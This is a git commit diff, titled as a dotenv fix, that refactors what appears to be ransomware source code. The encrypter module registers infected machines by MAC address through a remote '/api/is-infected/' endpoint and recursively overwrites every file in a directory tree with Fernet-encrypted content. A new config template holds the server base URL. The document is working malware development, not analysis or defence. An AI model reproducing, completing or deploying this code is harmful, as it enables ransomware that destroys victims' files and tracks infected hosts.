a5abf771c4cfcf2bf21eb76b85b3305ee5624a3d
medericcareil <mederic.careil@gmail.com>
2023-03-30 16:03:13 +0200

    fix: error from dotenv const

--- python/encrypter.py
+++ python/encrypter.py
@@ -2,19 +2,13 @@ from cryptography.fernet import Fernet
 import os
 import requests
 from device_infos import get_mac_address
-from dotenv import load_dotenv
-from pathlib import Path
-
-
-dotenv_path = Path('./.env')
-load_dotenv(dotenv_path=dotenv_path)
-base_api_url = os.getenv('BASE_API_URL')
+from env import BASE_API_URL
 
 
 class KeyGenerator:
-    def keyExist(self) -> bool :
+    def keyExist(self):
         mac_address = get_mac_address()
-        response = requests.get(base_api_url + '/api/is-infected/' + mac_address)
+        response = requests.get(BASE_API_URL + '/api/is-infected/' + mac_address)
         if response.status_code == 200:
             data = response.json()
             return data['is_infected']
@@ -22,21 +16,20 @@ class KeyGenerator:
         
 
     def generateKey(self):
-        if self.keyExist() is False:
+        if self.keyExist() is not True:
             return Fernet.generate_key()
 
 
 class Encrypter:
-    _fernet = ''
-    _key = ''
+    _fernet : Fernet
+    _key : bytes
 
-
-    def __init__(self, key):
+    def __init__(self, key) -> None :
         self._key = key
         self._fernet = Fernet(self._key)
     
 
-    def encrypt(self, path, *excludeExtensions): 
+    def encrypt(self, path, *excludeExtensions) -> int : 
         i = 0
         for root, dirs, files in os.walk(path):
             for entry in files:
@@ -46,7 +39,6 @@ class Encrypter:
                     encrypted = self._fernet.encrypt(original)
                     with open(os.path.join(root, entry), 'wb') as encrypted_file:
                         encrypted_file.write(encrypted)
-                i += 1
-        print(str(i) + ' fichiers encryptés dans le dossier : ' + path)
+            i += 1
         return i
     
---
+++ python/env.exemple.py
@@ -0,0 +1,2 @@
+# You need to create env.py with following const
+BASE_API_URL='Your API base url'
